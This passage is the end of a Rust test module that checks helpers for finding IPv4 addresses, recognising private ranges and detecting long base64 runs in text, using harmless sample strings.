        assert_eq!(find_ipv4("no addresses here"), None);
        assert!(is_private_ipv4("192.168.1.5"));
        assert!(!is_private_ipv4("8.8.8.8"));

        let blob = "QWxhZGRpbjpvcGVuIHNlc2FtZSBhbmQgdGhlbiBzb21lIG1vcmUgcGFkZGluZzEyMzQ1Njc4OTA=";
        assert!(longest_base64_run(&format!("prefix {blob} suffix")).is_some());
        assert!(longest_base64_run("C:\\Windows\\System32\\drivers\\etc\\hosts").is_none());
        assert!(longest_base64_run("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa").is_none());
    }
}
